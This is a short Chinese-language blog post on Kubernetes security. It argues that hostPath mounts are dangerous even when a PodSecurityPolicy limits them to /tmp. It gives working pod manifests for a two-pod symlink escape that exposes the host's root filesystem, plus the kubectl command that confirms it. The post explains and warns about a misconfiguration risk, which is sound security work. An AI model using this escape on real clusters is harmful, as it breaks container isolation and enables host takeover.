---
title: hostpath is dangerous
layout: post
categories: k8s
tags: k8s security
date: 2024-02-02 18:00
excerpt: hostpath is dangerous
---

{:.table-of-content}
* TOC
{:toc}

# 令人不安的hostPath
在k8s中，如果允许一个用户创建pod，则意味着该用户可以控制整个集群。很多时候又想给创建pod的权限，又不想他能控制集群，故使用psp（PodSecurityPolicy）来增加安全性（在新版PodSecurity中，其baseline的标准中就禁止了hostPath）。关于hostPath的历史问题可参考[Kubernetes and HostPath, a Love-Hate Relationship](https://blog.quarkslab.com/kubernetes-and-hostpath-a-love-hate-relationship.html)。

## 限制hostPath
当要使用hostPath又不想暴露宿主机上的关键目录，一个自然的想法就是使用psp来限制用户只能挂载某几个宿主机目录，但如果容器可以写hostPath目录的话，仍然可以逃逸
```yaml
apiVersion: policy/v1beta1
kind: PodSecurityPolicy
metadata:
  name: restrict-tmp-mount
spec:
  privileged: false 
  volumes:
    - 'hostPath'
  allowedHostPaths:
    - pathPrefix: "/tmp" # 仅允许挂载 /tmp 目录
      readOnly: false
  runAsUser:
    rule: 'RunAsAny'
  seLinux:
    rule: 'RunAsAny'
  fsGroup:
    rule: 'RunAsAny'
```

## 逃逸
使用两个pod进行逃逸，在第一个pod中挂载了`/tmp`目录，并在里面创建了一个指向根目录的符号链接`host_root`，然后创建第二个pod，挂载`/tmp/host_root`，这样就可以访问宿主机根目录了
```yaml
apiVersion: v1
kind: Pod 
metadata:
  name: test
spec:
  containers:
  - image: ubuntu
    name: test
    command: ["bash"]
    args: ["-c", "ln -s / /mnt/host_root && sleep 10000"]
    volumeMounts:
    - mountPath: /mnt
      name: test-vol
  volumes:
  - name: test-vol
    hostPath:
      path: /tmp
---
apiVersion: v1
kind: Pod 
metadata:
  name: test1
spec:
  initContainers:
  - name: sleep
    image: ubuntu
    command: ["sleep"]
    args: ["120"]
  containers:
  - image: ubuntu
    name: test1
    command: ["sleep"]
    args: ["10000"]
    volumeMounts:
    - mountPath: /mnt
      name: test-vol
  volumes:
  - name: test-vol
    hostPath:
      path: /tmp/host_root
```

等创建好后，执行kubectl查看test1下的/mnt目录，此时的/mnt就是宿主机根目录了
```shell
kubectl exec test1 -- ls /mnt/ -l
```
